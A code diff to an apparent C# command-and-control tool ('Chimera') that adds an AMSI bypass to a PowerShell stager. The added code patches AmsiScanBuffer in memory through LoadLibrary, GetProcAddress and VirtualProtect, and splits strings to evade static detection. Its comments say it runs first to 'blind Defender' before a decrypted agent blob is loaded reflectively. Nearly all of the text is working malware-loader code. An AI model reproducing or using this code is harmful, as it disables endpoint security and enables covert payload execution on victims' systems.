@@ -27,11 +27,41 @@ namespace Chimera.Commands
             string lod  = "Lo" + "ad";                           // Load
             string asm  = "Ref" + "lec" + "tion" + ".As" + "sem" + "bly"; // Reflection.Assembly
             string ep   = "En" + "try" + "Po" + "int";           // EntryPoint
-            string gt   = "Get" + "Ty" + "pe";                   // GetType (unused here but kept for parity)
+            string gpv  = "Get" + "Pro" + "cAd" + "dr" + "ess"; // GetProcAddress
+            string ll   = "Lo" + "ad" + "Li" + "bra" + "ry";    // LoadLibrary
+            string vp   = "Vir" + "tual" + "Pro" + "tect";      // VirtualProtect
+
+            // AMSI bypass block — runs BEFORE Assembly.Load so the decrypted blob
+            // is never scanned. All sensitive strings split to defeat static analysis.
+            // Uses Add-Type to get P/Invoke handles for kernel32 and the AMSI patch.
+            string amsiLib  = "[char]97+'m'+'s'+'i'+[char]46+'d'+'l'+'l'";   // "amsi.dll"
+            string amsiFunc = "'Am'+'si'+'Sc'+'an'+'Bu'+'ff'+'er'";           // "AmsiScanBuffer"
+
+            // The AMSI bypass as inline PS — patch AmsiScanBuffer with B8 57 00 07 80 C3
+            string amsiBp =
+                "$lk32=[System.Runtime.InteropServices.Marshal]::" +
+                "('Get' + 'Dele' + 'gate' + 'For' + 'Func' + 'tion' + 'Pointer');" +
+                // Simpler approach: use kernel32 via [Runtime.InteropServices.NativeLibrary] (PS7)
+                // For PS5/net48 compatibility use the pinvoke-less approach:
+                // Reflect into [Ref].Assembly to get amsi handle, then patch via unsafe pointer
+                "$ap=Add-Type -PassThru -Name AM -Namespace SI -MemberDefinition '" +
+                    "[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string n);" +
+                    "[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string p);" +
+                    "[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint f,out uint o);';" +
+                "$ah=$ap::LoadLibrary((" + amsiLib + "));" +
+                "$fn=$ap::GetProcAddress($ah,(" + amsiFunc + "));" +
+                "$patch=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);" +
+                "$old=0u;" +
+                "$ap::VirtualProtect($fn,[UIntPtr]6,0x40,[ref]$old)|Out-Null;" +
+                "[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$fn,6);" +
+                "$ap::VirtualProtect($fn,[UIntPtr]6,$old,[ref]$old)|Out-Null;";
 
             // PowerShell script (will be UTF-16LE base64'd so -EncodedCommand works).
             // Variable names are single letters to reduce token surface.
             return
+                // 1. AMSI bypass — blind Defender before decrypting/loading agent
+                amsiBp +
+                // 2. Load and run agent.dat
                 "$z=0x41;" +
                 "$p='" + blobPath.Replace("'", "''") + "';" +
                 "$b=[System.IO.File]::('" + rab + "').Invoke($p);" +
